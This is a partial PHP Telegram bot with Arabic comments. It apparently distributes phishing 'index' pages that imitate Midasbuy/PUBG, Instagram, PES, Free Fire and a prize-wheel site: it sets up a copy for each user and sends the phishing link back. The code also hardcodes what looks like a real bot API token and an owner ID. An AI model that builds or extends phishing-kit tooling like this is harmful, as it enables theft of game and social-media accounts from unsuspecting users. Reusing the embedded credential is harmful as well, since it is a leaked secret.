<?php
$SPAM = "5664125980:AAEACWNgE8JpTMFP6sSOxuNYe8lWOp7uEiM";
define('API_KEY',"$SPAM");
...
$spin = ("skin.zip"); #مسار اندكس عجلة الحظ
$pes = ("pes.zip"); #مسار اندكس بيس
$insta = ("insta.zip"); #مسار اندكس الانستا
$freefire = ("freefire.zip"); #مسار اندكس فري فاير

#صور الاندكسات#
$midasbuyphoto = ("https://t.me/DDH_I/78"); #صورة اندكس الشدات
$spinphoto = ("https://t.me/INDEXSR/2"); #صورة اندكس عجبة الحظ
$pesphoto = ("https://t.me/INDEXSR/4"); #صورة اندكس بيس
$instaphoto = ("https://t.me/INDEXSR/3"); #صورة اندكس الانستا
$freefirephoto = ("https://t.me/INDEXSR/5"); #صورة اندكس فري فاير
$link = "Website Link"; #رابط الاستضافة

#التخزين#
mkdir("database-links");
mkdir("indexdata");
$sudo = 5391283558; #ايدي صاحب البوت

#الاشتراك الاجباري#
$fox_iq = "root8080"; #معرف القناة بدون @
...
if($text == '🎡 • اسكنات , 🎠' and !file_exists("pubg/$from_id/s/index.php")){ 
...
if($text == '🎡 • اسكنات , 🀄' and $link_spin == "link-spin-done"){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>
"✅ • تم العثور علي الرابط بنجاح , 🎪
